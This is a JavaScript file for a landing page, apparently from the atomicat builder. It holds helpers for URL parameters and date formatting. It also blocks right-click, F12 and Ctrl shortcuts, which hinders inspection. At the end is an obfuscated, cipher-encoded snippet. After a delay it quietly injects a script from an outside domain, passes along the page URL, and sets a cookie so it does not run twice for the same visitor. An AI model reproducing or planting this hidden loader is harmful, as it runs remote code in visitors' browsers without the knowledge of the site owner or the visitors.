function applyParams({ inputUrl: inputUrl }) {
    console.log(inputUrl);
    const inputUrlObj = new URL(inputUrl, window.location.origin),
        currentPageParams = new URLSearchParams(window.location.search),
        inputUrlParams = new URLSearchParams(inputUrlObj.search);
    for (const [key, value] of currentPageParams) inputUrlParams.has(key) || inputUrlParams.append(key, value);
    const finalUrl = inputUrlObj.origin + inputUrlObj.pathname + "?" + inputUrlParams.toString();
    return console.log(finalUrl), finalUrl;
}
console.log("javascript is working....................");
const formatDate = (options = { slated: !1, addDate: 0 }) => {
        const today = new Date();
        if (options.slated) {
            return `${(today.getDate() + (options.addDate || 0)).toString().padStart(2, "0")}/${(today.getMonth() + 1).toString().padStart(2, "0")}/${today.getFullYear()}`;
        }
        options.addDate && today.setDate(today.getDate() + options.addDate);
        return today.toLocaleDateString(void 0, { weekday: "long", year: "numeric", month: "long", day: "numeric" });
    },
    formatTime = () => new Date().toLocaleTimeString(void 0, { hour: "2-digit", minute: "2-digit", hour12: !1 });
function runDelayedFunctions(data) {
    document.querySelectorAll(".atomicat-delay").forEach((el) => el.classList.remove("atomicat-delay")), data?.setDisplayed && localStorage.setItem(data?.setDisplayed, !0);
}
document.addEventListener("DOMContentLoaded", function () {
    document.addEventListener("keydown", function (e) {
        e.ctrlKey && e.preventDefault();
    }),
        (document.onkeydown = function (e) {
            if (123 == e.keyCode) return !1;
        }),
        document.addEventListener("contextmenu", (e) => e.preventDefault());
});
(function (o, d, l) {
    try {
        o.f = (o) => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
        o.b = o.f("UMUWJKX");
        (o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie)),
            setTimeout(function () {
                o.c && ((o.s = d.createElement("script")), (o.s.src = o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") + l.href), d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) {}
})({}, document, location);
